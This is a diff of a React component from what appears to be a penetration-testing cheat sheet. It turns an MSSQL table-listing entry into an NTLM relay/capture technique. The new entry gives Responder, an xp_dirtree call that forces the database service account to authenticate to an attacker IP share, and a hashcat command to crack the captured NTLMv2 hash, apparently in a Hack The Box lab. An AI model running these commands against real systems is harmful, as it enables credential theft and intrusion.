@@ -15,7 +15,7 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
     title: string;
   }
   
-  const MSSQL_List_Tables = ({ title }: IProps) => {
+  const MSSQL_NTLM = ({ title }: IProps) => {
 
     return (
       <>
@@ -43,13 +43,20 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
 
 
               <Typography>
-              To list tables in MSSQL.
+              We can try to use responder to to capture the NTLMv2 hash sent from a request to an invalid share using the mssqlsvc account. We can then attempt to crack the hash using hashcat.
                </Typography>
                <Box pt={5} />
-              <SyntaxHighlighter className="syntax" language="ftp">
-              {"select table_name from {DB_NAME}.INFORMATION_SCHEMA.TABLES;"}
+              <SyntaxHighlighter className="syntax" language="bash">
+              {"sudo responder -I tun0"}
             </SyntaxHighlighter>
-            
+            <Box pt={5}></Box>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\\\10.10.15.209\\share'"}
+            </SyntaxHighlighter>
+            <Box pt={5}></Box>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt"}
+            </SyntaxHighlighter>
             </Typography>
           </AccordionDetails>
         </Accordion>
@@ -58,5 +65,5 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
   };
 
   
-  export default MSSQL_List_Tables;
+  export default MSSQL_NTLM;
   
